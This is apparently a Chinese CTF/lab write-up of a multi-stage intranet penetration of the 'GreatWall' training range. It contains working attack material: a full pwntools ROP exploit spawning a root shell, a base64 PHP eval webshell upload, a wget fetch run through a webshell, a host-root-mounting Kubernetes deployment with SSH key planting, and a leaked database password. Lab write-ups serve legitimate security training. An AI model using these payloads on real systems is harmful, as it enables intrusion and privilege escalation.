# 春秋云境-GreatWall综合渗透


第一届长城杯半决赛渗透题赛后复现

<!--more-->

# 春秋云境-GreatWall

![image-20240905011712407](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240905011712407.png?imageSlim)

```
在这个靶场中，您将扮演一名渗透测试工程师，接受雇佣任务来评估“SmartLink Technologies Ltd.”公司的网络安全状况。 您的任务是首先入侵该公司暴露在公网上的应用服务，然后运用后渗透技巧深入 SmartLink公司的内部网络。在这个过程中，您将寻找潜在的弱点和漏洞，并逐一接管所有服务，从而控制整个内部网络。靶场中共设置了6个Flag，它们分布在不同的靶机上，您需要找到并获取这些 Flag 作为您的成就目标。
```

### 8.130.13.188（172.28.23.17）

![image-20240902211653832](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240902211653832.png?imageSlim)

扫描端口，发现8080后台登陆段

thinkphp框架， 5.0.23 RCE的nday

![image-20240902211943377](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240902211943377.png?imageSlim)

直接getshell

![](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240902212545408.png?imageSlim)

蚁剑连过去，在根目录找到第一个flag

![](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240902212641552.png?imageSlim)

查看网卡信息

![](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240902212904790.png?imageSlim)

上传fscan扫描内网网段

![image-20240903113059646](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903113059646.png?imageSlim)

（起初fscan反应不正常，后来发现是蚁剑连接的问题，直接将输出结果写入result）

![image-20240903133015294](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903133015294.png?imageSlim)

发现内网资产，上传frp内网穿透+proxifier代理，将shell的内网流量转发出来

### 内网一层代理

```
# frp_0.53.2
nohup /tmp/frpc -c /tmp/frpc.toml &
# Proxifier
socks5 <your-ip> <your-port>
```

![image-20240903004905613](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903004905613.png?imageSlim)

（这里踩了许多坑.....）

## 第一层

### 172.28.23.33- ERP 后台

转发出来之后，通过本地直接访问目标内网资产

![image-20240903113734984](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903113734984.png?imageSlim)

根据fscan的扫描结果可知是Shiro框架+heapdump泄露

```
172.28.23.33:8080/actuator/heapdump
```

随后

```
java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
```

![image-20240903114719211](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903114719211.png?imageSlim)

得到shiro-key

![image-20240903121212024](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903121212024.png?imageSlim)

注入内存马，冰蝎连过去

![image-20240903121346488](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903121346488.png?imageSlim)

当前为普通用户权限，应该是要提权

![image-20240903121759721](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903121759721.png?imageSlim)

查看主机开放端口

```
netstat -tulnp
```

![image-20240903121908477](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903121908477.png?imageSlim)

在/home/ops01目录下发现HashNote文件

![image-20240903125048959](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903125048959.png?imageSlim)

对 HashNote 进行分析。程序对 password 做了校验，username 输入任意值均可。

```
password 值：
freep@ssw0rd:3
```

提权脚本:https://www.dr0n.top/posts/f249db01/

```
from pwn import *
context.arch='amd64'

def add(key,data='b'):
    p.sendlineafter(b'Option:',b'1')
    p.sendlineafter(b'Key:',key)
    p.sendlineafter(b'Data:',data)

def show(key):
    p.sendlineafter(b'Option:',b'2')
    p.sendlineafter(b"Key: ",key);

def edit(key,data):
    p.sendlineafter(b'Option:',b'3')
    p.sendlineafter(b'Key:',key)
    p.sendlineafter(b'Data:',data)

def name(username):
    p.sendlineafter(b'Option:',b'4')
    p.sendlineafter(b'name:',username)


p = remote('172.28.23.33', 59696)
# p = process('./HashNote')


username=0x5dc980
stack=0x5e4fa8
ukey=b'\x30'*5+b'\x31'+b'\x44'

fake_chunk=flat({
    0:username+0x10,
    0x10:[username+0x20,len(ukey),\
        ukey,0],
    0x30:[stack,0x10]
    },filler=b'\x00')

p.sendlineafter(b'name',fake_chunk)
p.sendlineafter(b'word','freep@ssw0rd:3')

add(b'\x30'*1+b'\x31'+b'\x44',b'test')   # 126
add(b'\x30'*2+b'\x31'+b'\x44',b'test')   # 127


show(ukey)
main_ret=u64(p.read(8))-0x1e0




rdi=0x0000000000405e7c # pop rdi ; ret
rsi=0x000000000040974f # pop rsi ; ret
rdx=0x000000000053514b # pop rdx ; pop rbx ; ret
rax=0x00000000004206ba # pop rax ; ret
syscall=0x00000000004560c6 # syscall

fake_chunk=flat({
    0:username+0x20,
    0x20:[username+0x30,len(ukey),\
        ukey,0],
    0x40:[main_ret,0x100,b'/bin/sh\x00']
    },filler=b'\x00')

name(fake_chunk.ljust(0x80,b'\x00'))


payload=flat([
    rdi,username+0x50,
    rsi,0,
    rdx,0,0,
    rax,0x3b,
    syscall
    ])

p.sendlineafter(b'Option:',b'3')
p.sendlineafter(b'Key:',ukey)
p.sendline(payload)
p.sendlineafter(b'Option:',b'9')
p.interactive()
```

![image-20240903131505136](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903131505136.png?imageSlim)

```
>whoami
root
```

进入/root目录得到flag3

![image-20240903131637494](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903131637494.png?imageSlim)

> vmware的流量挂proxifier代理：
>
> 摘自先知社区：https://xz.aliyun.com/t/13167
>
> 很多时候，作为攻击队，我们都需要在纯净的武器库虚拟机中完成自己的渗透（因为蜜罐会尝试获取浏览器Cookie和本地文件，用自己的实体机很快就能被溯源），如何直接让所有的虚拟机都走上代理呢？
>
> **注：本文这个方法，无视任何类型的系统类型和对应配置，只要配置VM网卡出网即可被代理**
>
> 如下配置：
>
> <img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903131747595.png?imageSlim" alt="image-20240903131747595" style="zoom:80%;" />
>
> 应用程序填写如下：
>
> ```
> vmware.exe; vmnetcfg.exe; vmnat.exe; vmrun.exe; vmware-vmx.exe; mkssandbox.exe; vmware-hostd.exe; vmnat.exe; vmnetdhcp.exe
> ```
>
> **VM虚拟机17以上版本-特别补充**
>
> 之前有挺多师傅反馈VMware 17以上版本无法将流量代理出来，苦于本地没装VMware 17，一直没空尝试，今天终于和 `nack0c` 师傅研究出了解决方法：
>
> ![image-20240903131844318](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903131844318.png?imageSlim)
>
> 在“配置文件”的“高级”处，选择“服务与其他用户”，然后勾选上两个选项：
>
> ![image-20240903131910555](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903131910555.png?imageSlim)
>
> 勾选上就可以解决VMware 17以上的版本无法代理的问题啦~祝师傅们玩的开心哈哈~
> **如果还是代理不上，请尝试本文的 `3.4 补充` 里面按操作导入配置文件**

![image-20240903132146306](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903132146306.png?imageSlim)

上传fscan扫描该网段，得到：172.22.10.28

![image-20240903140751296](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903140751296.png?imageSlim)

### 172.28.23.26- 新翔 OA

在之前的fscan扫描结果中发现有ftp可匿名登陆

![image-20240903133015294](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903133015294.png?imageSlim)

ftp连过去

![image-20240903142738563](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903142738563.png?imageSlim)

```
get OASystem.zip
```

从`main.php`开始进行代码审计，开头引入了`db.php`和`checklogin.php`

checklogin.php中

```php
<?php
function islogin(){
   if(isset($_COOKIE['id'])&&isset($_COOKIE['loginname'])&&isset($_COOKIE['jueseid'])&&isset($_COOKIE['danweiid'])&&isset($_COOKIE['quanxian'])){
	   if($_COOKIE['id']!=''&&$_COOKIE['loginname']!=''&&$_COOKIE['jueseid']!=''&&$_COOKIE['danweiid']!=''&&$_COOKIE['quanxian']!=''){
	       return true;
	   }
	    else {
	      return false;
	   }
    }
    else {
	    return false;
     }
}
?>
```

`Cookie: id=1;loginname=1;jueseid=1;danweiid=1;quanxian=1` 直接登录main.php

![image-20240903143437902](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903143437902.png?imageSlim)

源码根目录下还有一个`uploadbase64.php`

```php
<?php
/**
 * Description: PhpStorm.
 * Author: yoby
 * DateTime: 2018/12/4 18:01
 * Email:logove@qq.com
 * Copyright Yoby版权所有
 */
$img = $_POST['imgbase64'];
if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $img, $result)) {
    $type = ".".$result[2];
    $path = "upload/" . date("Y-m-d") . "-" . uniqid() . $type;
}
$img =  base64_decode(str_replace($result[1], '', $img));
@file_put_contents($path, $img);
exit('{"src":"'.$path.'"}');
```

对于上传的校验不完整，只要符合格式是`data:image/xxx;base64,xxx`这种就行

![image-20240903145439892](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903145439892.png?imageSlim)

```
POST /uploadbase64.php HTTP/1.1
Host: 172.28.23.26
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 76

imgbase64=data:image/php;base64,PD89YCRfR0VUWzFdYDtldmFsKCRfUE9TVFsxXSk7Pz4=
```

![image-20240903150945360](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903150945360.png?imageSlim)

用蚁剑的插件绕过disable_functions（大部分功能只支持Linux系统）

![image-20240903173301645](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903173301645.png?imageSlim)

成功后，再创建一个GET一句话木马/upload/1.php，将.antproxy.php第37行的url改成/upload/1.php

```
#/upload/1.php
<?php eval($_GET[1]);?>
```

![image-20240903173626802](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903173626802.png?imageSlim)

![image-20240903174121983](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903174121983.png?imageSlim)

访问.antproxy.php（相当于访问没有disabled_functions的1.php文件），执行系统命令，发现base32有suid，可进行利用

![image-20240903174737620](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903174737620.png?imageSlim)

不能直接读flag02.txt

执行`find / -perm -u=s -type f 2>/dev/null`，发现`base32`有suid权限，可以利用

![image-20240903180558164](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903180558164.png?imageSlim)

![image-20240903180713790](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903180713790.png?imageSlim)

### 内网信息收集

![image-20240903180913566](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240903180913566.png?imageSlim)

上传fscan，扫描172.22.14.0/24网段

```
http://172.28.23.26/upload/.antproxy.php?a=system("wget http://172.28.23.17:8080/fscan");
```

### 内网二层代理

**172.28.23.17**

```
chmod +x frps
nohup ./frps -c frps.ini &
```

172.28.23.33

```
chmod +x frpc
nohup ./frpc -c frpc.ini &
```

Proxifier Chains

```
socks5 <your-ip> <your-port>
socks5 172.28.23.17 <your-port>
```

代理链

![image-20240904213403727](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240904213403727.png?imageSlim)

代理规则

![image-20240904213342504](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240904213342504.png?imageSlim)

第二层打通，扫一下172.22.14.0/24网段

![image-20240904214110671](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240904214110671.png?imageSlim)

成功访问 Harbor：

## 第二层

### 172.22.14.46- Harbor

![image-20240904213425890](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240904213425890.png?imageSlim)

Harbor 公开镜像仓库未授权访问 CVE-2022-46463

https://github.com/404tk/CVE-2022-46463

Linux 环境下运行 harbor.py

```
python3 harbor.py http://172.22.14.46/
```

#### 公开镜像一：harbor/secr

```
python3 harbor.py http://172.22.14.46/ --dump harbor/secret --v2
```

![image-20240904215622415](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240904215622415.png?imageSlim)

随后分析镜像文件，找到 flag05：

![image-20240904215800072](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240904215800072.png?imageSlim)

#### 公开镜像二：project/projectadmin

```
python3 harbor.py http://172.22.14.46 --dump project/projectadmin --v2
```

![image-20240904223425546](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240904223425546.png?imageSlim)

分析镜像文件，发现运行了 `run.sh`，内容如下：

![image-20240904223439488](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240904223439488.png?imageSlim)

`ProjectAdmin-0.0.1-SNAPSHOT.jar`。反编译，在 SpringBoot 配置文件 `application.properties` 中找到数据库账号密码：

```
spring.datasource.url=jdbc:mysql://172.22.10.28:3306/projectadmin?characterEncoding=utf-8&useUnicode=true&serverTimezone=UTC
spring.datasource.username=root
spring.datasource.password=My3q1i4oZkJm3
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
```

#### MySQL UDF 提权（flag06）

![image-20240905000140191](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240905000140191.png?imageSlim)

再写一个规则，连上mysql

MDUT直接梭

![image-20240905005729500](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240905005729500.png?imageSlim)

> 折腾了好一顿才用这个工具连上
>
> 工具自身的mysql驱动目录配置有问题

![image-20240905005919462](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240905005919462.png?imageSlim)

### 172.22.14.37- k8s

（k8s这块实在不会，照着人家wp打的）

`k8s kubelet 10250端口未授权`，但是不符合利用条件

还有一个6443端口的Api Server未授权

![image-20240905010513335](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240905010513335.png?imageSlim)

编辑恶意yaml

```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deployment
  labels:
    app: nginx
spec:
  replicas: 1
  selector:
    matchLabels:
      app: nginx
  template:
    metadata:
      labels:
        app: nginx
    spec:
      containers:
      - name: nginx
        image: nginx:1.8
        volumeMounts:
        - mountPath: /mnt
          name: test-volume
      volumes:
      - name: test-volume
        hostPath:
          path: /
```

创建pod

```
kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ apply -f evil.yaml
```

列出pod

```
kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods -n default
```

![image-20240905011231329](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240905011231329.png?imageSlim)

进容器

```
kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ exec -it nginx-deployment-864f8bfd6f-zfgqd /bin/bash
```

写公钥

```
echo "ssh-rsa xxxx" > /mnt/root/.ssh/authorized_keys
```

ssh连接，在数据库中得到flag

![image-20240905011310552](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240905011310552.png?imageSlim)

读取flag

![image-20240905011328861](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240905011328861.png?imageSlim)

